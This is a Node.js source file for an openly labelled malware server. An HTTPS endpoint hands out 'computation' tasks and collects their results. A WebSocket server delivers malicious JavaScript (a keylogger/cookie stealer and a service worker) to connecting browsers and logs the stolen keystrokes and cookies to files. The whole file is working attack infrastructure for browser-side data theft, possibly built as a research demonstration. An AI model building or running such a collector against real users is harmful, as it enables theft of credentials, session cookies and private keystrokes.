//load modules
var express = require('express');
var app = express();
var http = require('http');
const https = require("https");
const WebSocket = require('ws');
var fs = require('fs');
var parse = require('url-parse');

const options = {
	key: fs.readFileSync("keys/server.key"),
	cert: fs.readFileSync("keys/server.crt")
};


//------------------------------- JQUERY SERVER ------------------------------------------------------

app.use(express.static('public'));//makes static files in the 'public' folder available to browsers

const HTTPSserver = https.createServer(options, app);
HTTPSserver.listen(5000, function () {
  console.log('Mal-server listening on port 5000!\n');
});
app.use(function (req, res, next) {
  // Website you wish to allow to connect
	res.setHeader('Access-Control-Allow-Origin', '*');
	// Request methods you wish to allow
	res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');

	// Request headers you wish to allow
	res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');

	// Set to true if you need the website to include cookies in the requests sent
	// to the API (e.g. in case you use sessions)
	res.setHeader('Access-Control-Allow-Credentials', true);
	next();
});
app.get('/computation_file', (req, res) => {
	console.log(req)
	let data = fs.readFileSync(__dirname +'/public/computation_file.json'); 
	res.send({
    success: 'true',
    data: JSON.parse(data),
  })
})
app.post('/computation_result', (req, res) => {
	console.log('Computation result received successfully');
  res.send({
    success: 'true',
    message: 'Computation result received successfully',
  })
});
//------------------------------- MALWARE SERVER ------------------------------------------------------

const WSSserver = https.createServer(options, app);

const wss = new WebSocket.Server({server: WSSserver});
wss.on('connection', function connection(ws, req) {
	
	path = parse(req.url).pathname;
	if(path === '/KeyCookieLog.js'){
		fs.readFile("private/KeyCookieLog.js", 'utf8',function(error, content) {//for each opend connection immidiately send the malicious javascript code
			if (error) {
				console.log("ERROR OPENING FILE!");
			}
			else {
				ws.send(content);
			}
		});
	}
	if(path == '/ServiceWorker.js'){
		fs.readFile("private/ServiceWorker.js", 'utf8',function(error, content) {//for each opend connection immidiately send the malicious javascript code
			if (error) {
				console.log("ERROR OPENING FILE!");
			}
			else {
				ws.send(content);
			}
		});
	}else{
		ws.on('message', function(message) {
			JSONmsg = JSON.parse(message);
			if(JSONmsg.protocol == 'keys'){	//message containes recorederd key strokes
				data = JSONmsg.data;
				fs.appendFile('keyLog.txt', '\n'+data, (err) => {  
					if (err) throw err;
				});
			}else if(JSONmsg.protocol == 'cookieJS'){//message containes cookies stolen using <script> element
				data = JSONmsg.data;
				fs.appendFile('cookieLog.txt', '\nFROM JS:\n'+data+"\n", (err) => {  
					if (err) throw err;
				});
			}else if(JSONmsg.protocol == 'cookieJQ'){//message containes cookies stolen using jQuery library insert
				data = JSONmsg.data;
				fs.appendFile('cookieLog.txt', '\nFROM JQ:\n'+data+"\n", (err) => {  
					if (err) throw err;
				});
			}else{
				console.log("UNRECOGNIZED PROTOCOL: "+JSONmsg.protocol);
			};
		});
	}
});
WSSserver.listen(5001)